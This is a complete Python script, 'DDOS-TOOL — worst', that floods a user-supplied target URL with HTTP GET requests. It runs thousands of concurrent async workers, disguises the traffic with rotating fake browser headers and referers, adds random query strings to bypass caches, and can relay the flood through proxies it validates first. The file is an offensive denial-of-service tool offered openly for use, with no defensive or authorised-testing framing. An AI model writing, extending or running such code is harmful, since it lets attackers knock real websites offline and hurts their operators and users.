"""
DDOS-TOOL — worst

Author / Developer / Admin / Owner: Aashu
GitHub:  @outwiles
Telegram: @outwiles
Email:   outwiles@proton.me

License: MIT
"""

import asyncio
import os
import random
import string
import sys
import time
from pathlib import Path
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import httpx


IS_WINDOWS = sys.platform.startswith("win")

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/",
]


def rand_token(n: int = 10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_headers() -> dict:
    return {
        "User-Agent": random.choice(UA_POOL),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Referer": random.choice(REFERERS),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "X-Request-Id": rand_token(16),
        "X-Client-Trace": rand_token(8),
    }


def normalize_proxy(line: str) -> str | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "://" not in line:
        line = "http://" + line
    scheme = line.split("://", 1)[0].lower()
    if scheme not in ("http", "https", "socks4", "socks5"):
        return None
    try:
        p = httpx.URL(line)
        if not p.host or not p.port:
            return None
    except Exception:
        return None
    return line


class ProxyRing:
    def __init__(self, path: str, max_fail: int = 2):
        self.path = Path(path)
        self.max_fail = max_fail
        self.ring: list[str] = []
        self.fails: dict[str, int] = {}
        self.idx = 0
        self.lock = asyncio.Lock()

    def load(self) -> tuple[int, int]:
        if not self.path.exists():
            raise FileNotFoundError(f"proxy file missing: {self.path}")
        raw = self.path.read_text().splitlines()
        good = []
        bad = 0
        for ln in raw:
            n = normalize_proxy(ln)
            if n is None:
                if ln.strip() and not ln.strip().startswith("#"):
                    bad += 1
                continue
            good.append(n)
        self.ring = good
        return len(good), bad

    async def next(self) -> str | None:
        async with self.lock:
            if not self.ring:
                return None
            for _ in range(len(self.ring)):
                url = self.ring[self.idx % len(self.ring)]
                self.idx += 1
                if self.fails.get(url, 0) < self.max_fail:
                    return url
            return None

    async def fail(self, url: str):
        async with self.lock:
            self.fails[url] = self.fails.get(url, 0) + 1

    async def ok(self, url: str):
        async with self.lock:
            self.fails[url] = 0

    def alive(self) -> int:
        return sum(1 for u in self.ring if self.fails.get(u, 0) < self.max_fail)


async def probe_proxy(proxy: str, timeout: float = 5.0) -> bool:
    try:
        async with httpx.AsyncClient(
            proxy=proxy,
            timeout=timeout,
            verify=False,
            follow_redirects=False,
            http2=False,
        ) as c:
            r = await c.get("http://api.ipify.org/")
            return r.status_code == 200
    except Exception:
        return False


async def filter_proxies(ring: ProxyRing, concurrency: int = 200) -> int:
    if not ring.ring:
        return 0
    sem = asyncio.Semaphore(concurrency)
    good: list[str] = []
    done = 0
    total = len(ring.ring)

    async def check(p: str):
        nonlocal done
        async with sem:
            ok = await probe_proxy(p)
            done += 1
            if ok:
                good.append(p)
            if done % 100 == 0:
                print(f"  probed {done}/{total} | alive so far: {len(good)}")

    await asyncio.gather(*(check(p) for p in ring.ring))
    ring.ring = good
    ring.fails.clear()
    return len(good)


class Runner:
    def __init__(self, url: str, concurrency: int, duration: int, ring: ProxyRing | None):
        self.url = url
        self.concurrency = concurrency
        self.duration = duration
        self.ring = ring
        self.sent = 0
        self.failed = 0
        self._stop = False
        self._lock = asyncio.Lock()
        self._clients: dict[str, httpx.AsyncClient] = {}
        self._errors_seen = 0
        self._last_report = time.time()
        self._last_sent = 0
        self._use_http2 = url.startswith("https://")

    def _bust(self) -> str:
        p = urlparse(self.url)
        q = parse_qsl(p.query)
        q.append(("_", rand_token(8)))
        return urlunparse(p._replace(query=urlencode(q)))

    def _client_for(self, proxy_url: str | None) -> httpx.AsyncClient:
        key = proxy_url or "__direct__"
        client = self._clients.get(key)
        if client is not None:
            return client

        kwargs = {
            "http2": self._use_http2,
            "verify": False,
            "follow_redirects": False,
            "timeout": httpx.Timeout(6.0, connect=6.0),
            "limits": httpx.Limits(max_connections=None, max_keepalive_connections=None),
        }
        if proxy_url:
            kwargs["proxy"] = proxy_url

        client = httpx.AsyncClient(**kwargs)
        self._clients[key] = client
        return client

    async def fire(self):
        if self.ring is not None:
            proxy_url = await self.ring.next()
            if proxy_url is None:
                self._stop = True
                return
        else:
            proxy_url = None

        url = self._bust()
        headers = build_headers()
        client = self._client_for(proxy_url)

        try:
            await client.get(url, headers=headers)
            if proxy_url:
                await self.ring.ok(proxy_url)
            async with self._lock:
                self.sent += 1
        except (BaseException, Exception):
            if proxy_url:
                await self.ring.fail(proxy_url)
            async with self._lock:
                self.failed += 1
                if self._errors_seen < 5:
                    self._errors_seen += 1
                    print(f"  err: request failed")

    async def worker(self, deadline: float):
        while time.time() < deadline and not self._stop:
            try:
                await self.fire()
            except BaseException:
                pass
            await asyncio.sleep(random.uniform(0.005, 0.12))

    async def reporter(self, deadline: float):
        while time.time() < deadline and not self._stop:
            await asyncio.sleep(5)
            now = time.time()
            async with self._lock:
                sent = self.sent
                failed = self.failed
            rps = (sent - self._last_sent) / max(0.001, now - self._last_report)
            self._last_report = now
            self._last_sent = sent
            alive = self.ring.alive() if self.ring else "-"
            total = len(self.ring.ring) if self.ring else "-"
            print(f"[{time.strftime('%H:%M:%S')}] sent={sent} failed={failed} rps={rps:.0f} proxies={alive}/{total}")

    async def run(self) -> dict:
        deadline = time.time() + self.duration if self.duration > 0 else float("inf")
        tasks = [asyncio.create_task(self.worker(deadline)) for _ in range(self.concurrency)]
        rep = asyncio.create_task(self.reporter(deadline))

        try:
            if self.duration > 0:
                await asyncio.gather(*tasks, return_exceptions=True)
            else:
                while not self._stop:
                    await asyncio.sleep(1)
                for t in tasks:
                    t.cancel()
        except (asyncio.CancelledError, KeyboardInterrupt):
            self._stop = True
            for t in tasks:
                t.cancel()

        self._stop = True
        rep.cancel()

        for c in self._clients.values():
            try:
                await c.aclose()
            except Exception:
                pass

        return {"sent": self.sent, "failed": self.failed}


def prompt(msg: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    val = input(f"{msg}{suffix}: ").strip()
    return val if val else (default or "")


def gather_inputs() -> dict:
    target = os.environ.get("AASHU_TARGET") or prompt("Target URL/IP")
    if not target:
        print("no target, exiting")
        sys.exit(1)

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    proxy_env = os.environ.get("AASHU_PROXIES")
    if proxy_env is not None:
        use_proxies = True
        proxy_file = proxy_env
    else:
        answer = prompt("Do you want to use proxies? (y/n)", "n").lower()
        use_proxies = answer.startswith("y")
        proxy_file = prompt("Proxy file path", "proxies.txt") if use_proxies else None

    threads = int(os.environ.get("AASHU_THREADS") or prompt("Threads", "80"))
    conns = int(os.environ.get("AASHU_CONNS") or prompt("Connections per thread", "40"))
    duration = int(os.environ.get("AASHU_DURATION") or prompt("Duration in seconds (0 = infinite)", "60"))

    return {
        "target": target,
        "use_proxies": use_proxies,
        "proxy_file": proxy_file,
        "threads": threads,
        "conns": conns,
        "duration": duration,
    }


async def main_async(opts: dict):
    ring = None
    if opts["use_proxies"]:
        ring = ProxyRing(opts["proxy_file"])
        good, bad = ring.load()
        print(f"loaded {good} proxies ({bad} malformed lines skipped)")
        if good == 0:
            print("no usable proxies, exiting")
            return
        print(f"probing {good} proxies (this can take a minute)...")
        t0 = time.time()
        alive = await filter_proxies(ring)
        print(f"probe done: {alive}/{good} alive in {time.time()-t0:.1f}s")
        if alive == 0:
            print("no proxies survived the probe, exiting")
            return

    concurrency = opts["threads"] * opts["conns"]
    print(f"starting: target={opts['target']} concurrency={concurrency} duration={opts['duration']}s")

    runner = Runner(opts["target"], concurrency, opts["duration"], ring)
    try:
        result = await runner.run()
    except KeyboardInterrupt:
        result = {"sent": runner.sent, "failed": runner.failed}
    print(f"result: {result}")


def main():
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    print("DDOS-TOOL — worst")
    print("Author / Developer / Admin / Owner: Aashu")
    print("GitHub: @outwiles | Telegram: @outwiles | Email: outwiles@proton.me")
    print()

    opts = gather_inputs()
    try:
        asyncio.run(main_async(opts))
    except KeyboardInterrupt:
        print("\nstopped")


if __name__ == "__main__":
    main()
